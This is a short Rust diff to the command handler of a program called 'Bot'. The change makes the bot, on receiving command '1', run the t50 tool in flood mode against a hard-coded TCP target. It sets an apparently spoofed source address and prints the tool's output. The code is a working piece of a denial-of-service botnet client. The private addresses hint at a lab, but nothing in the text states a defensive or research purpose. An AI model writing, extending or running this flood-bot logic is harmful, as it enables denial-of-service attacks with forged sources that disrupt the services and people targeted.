@@ -64,10 +64,12 @@ impl Bot {
                 let cmd: String = parts.next().unwrap().to_string();
                 if cmd == "1" {
                     let duration: String = parts.next().unwrap().to_string();
-                    Command::new("timeout")
-                        .args(&[&duration, "t50", "--flood", "target"])
+                    println!("Beggining attack");
+                    let cmd_handle = Command::new("timeout")
+                        .args(&[&duration, "t50","172.20.0.2", "--flood", "-p", "tcp", "-s", "172.18.0.5"])
                         .output()
                         .expect("failed to run t50");
+                    println!("{}", String::from_utf8(cmd_handle.stdout).unwrap());
                 }
             }
             Err(error) => println!("Error encountered: {}", error),
